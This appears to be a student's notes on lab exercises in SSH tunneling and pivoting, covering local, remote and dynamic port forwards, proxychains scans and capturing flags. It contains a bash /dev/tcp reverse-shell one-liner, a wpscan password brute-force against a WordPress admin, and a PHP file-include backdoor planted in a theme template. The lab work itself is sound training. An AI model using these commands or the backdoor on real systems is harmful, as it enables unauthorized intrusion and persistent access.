
# 20.2.2.5
There is an internally hosted website on the target VM #1 which is reachable only from the server's **local address space**. Browse to this server to get the flag  

```bash
ssh -N -L 0.0.0.0:8080:127.0.0.1:80 student@192.168.126.52 -p 2222
```
	first octet: local (attack) listener  
	second octet: target in perspective of the box you're tunneling through  
	user@ip: compromised victim used for tunneling  
  
```bash
curl localhost:8080
```  
	(also, I literally ssh'd into the machine and cat'd /var/www/html/index.html, but that's not the point of this exercise, so...)  
  

  
# 20.2.4.4
The target VM #1 machine has an exploit that is triggered by root every minute that executes a basic _reverse shell_.  
Unfortunately, that shell is trying to connect back to the internal port _5555_ on _127.0.0.1_ on that server, and the server has no tools available to catch this shell.  
To solve this challenge, forward this reverse shell callback from the remote server to your local machine and then use this shell to read the flag.  
  
On Kali: ssh -N -R target_vm:shell_port:kali_localhost:arbitrary_port:
```bash
ssh -N -R 192.168.126.52:5555:127.0.0.1:2221 student@192.168.126.52 -p 2222  
  
  
	<different terminal window>  
  
nc -nlvp 2221
```
	** Can take a minute to get the reverse shell. If nc listener errors out, start the listener first, _then_ ssh

```bash
cat rev.sh  
#!/bin/bash  
bash -i >& /dev/tcp/127.0.0.1/5555 0>&1
```

  

# 20.2.6.6
There is a service running on some TCP port in the range of _30000-35000_ on the target VM #1.  
Find it, and you will find the flag. _Note_: scan takes a couple minutes  

```bash
ssh -N -D 127.0.0.1:8080 student@192.168.173.52 -p 2222  
  
  
	<different terminal window>  
  
proxychains nmap 127.0.0.1 -Pn -p 30000-35000  
	...  
	[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:33525 <-socket error or timeout!  
	[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:31124 <--socket error or timeout!  
	Nmap scan report for localhost (127.0.0.1)  
	Host is up (0.066s latency).  
	Not shown: 5000 closed tcp ports (conn-refused)  
	PORT      STATE SERVICE  
	34023/tcp open  unknown  
  
proxychains nc -nvv 127.0.0.1 34023
```
	nc conn may be a little laggy  
  

  
# 20.2.6.7
There is a WordPress instance running on the target VM #2 that is only accessible locally.  
The flag is not simply in a post once you log in - you need to use this administrative web to gain access to the box as _www-data_.  
To save you time, the admin user is _offsec_. Use your local user SSH access to forward your password attack traffic to this server to determine the admin password.  
Then, utilize this admin access to get a web shell and, finally, read _/home/flag.txt_ to solve this challenge.  
_Note_: for this exercise try different well-known wordlists. Also, make sure to block browser's DNS requests over proxychains.  

```bash
ssh -N -D 127.0.0.1:8080 student@192.168.173.52 -p 2222  
  
  
	<different terminal window>  
  
proxychains nmap 127.0.0.1 -Pn  
	PORT     STATE SERVICE  
	22/tcp   open  ssh  
	80/tcp   open  http  
	3306/tcp open  mysql  
  
  
proxychains wpscan --url http://127.0.0.1/wp-login.php -U offsec -P /usr/share/wordlists/rockyou.txt  
	[!] Valid Combinations Found:  
	 | Username: offsec, Password: amanda1  
  
  
proxychains -q firefox http://localhost:80/wp-login.php
```
	****NOTE: firefox loading will take FOREVER.  
  
Login w/ creds.  
Once at WP Dashboard, On left -  
GoTo - Appearence > Editor > (right side) 404.php Template  
Add & Update file:  
```php
<?php  
    $file = $_GET["file"];  
    include $file;  ?>
```

Navigate to: hXXp://127.0.0.1/wp-content/themes/<theme_name>/404.php?file=/home/flag.txt